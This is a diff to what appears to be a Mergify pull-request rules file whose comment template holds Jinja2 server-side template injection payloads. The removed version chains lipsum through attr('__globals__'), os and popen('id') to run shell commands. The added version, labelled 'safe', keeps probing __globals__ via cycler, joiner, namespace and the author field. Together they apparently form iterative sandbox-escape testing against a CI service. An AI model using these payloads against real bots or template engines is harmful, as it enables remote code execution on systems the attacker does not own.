@@ -1,18 +1,18 @@
 pull_request_rules:
-  - name: ssti-v9-attr-chain
+  - name: ssti-v10-safe
     conditions: []
     actions:
       comment:
         message: |
-          === G4o7T v9 attr-chain ===
+          === G4o7T v10 (default catches Undefined) ===
           author={{ author }}
           {% if author %}
-          A1-attr-globals: {{ lipsum | attr('__globals__') }}
-          A2-attr-globals-os: {{ lipsum | attr('__globals__') | attr('os') }}
-          A3-attr-popen: {{ lipsum | attr('__globals__') | attr('os') | attr('popen') }}
-          A4-attr-popen-call: {{ lipsum | attr('__globals__') | attr('os') | attr('popen')('id') }}
-          A5-attr-rce: {{ lipsum | attr('__globals__') | attr('os') | attr('popen')('id') | attr('read')() }}
-          A6-via-cycler: {{ cycler | attr('__globals__') }}
-          A7-via-joiner: {{ joiner | attr('__globals__') }}
-          A8-via-namespace: {{ namespace | attr('__globals__') }}
+          D1-author-globals: {{ (author | attr('__globals__')) | default('UNDEF') }}
+          D2-lipsum-globals: {{ (lipsum | attr('__globals__')) | default('UNDEF') }}
+          D3-cycler-globals: {{ (cycler | attr('__globals__')) | default('UNDEF') }}
+          D4-joiner-globals: {{ (joiner | attr('__globals__')) | default('UNDEF') }}
+          D5-namespace-globals: {{ (namespace | attr('__globals__')) | default('UNDEF') }}
+          D6-lipsum-call: {{ (lipsum()) | default('UNDEF') }}
+          D7-joiner-call: {{ (joiner()) | default('UNDEF') }}
+          D8-cycler-call: {{ (cycler('a','b')) | default('UNDEF') }}
           {% endif %}
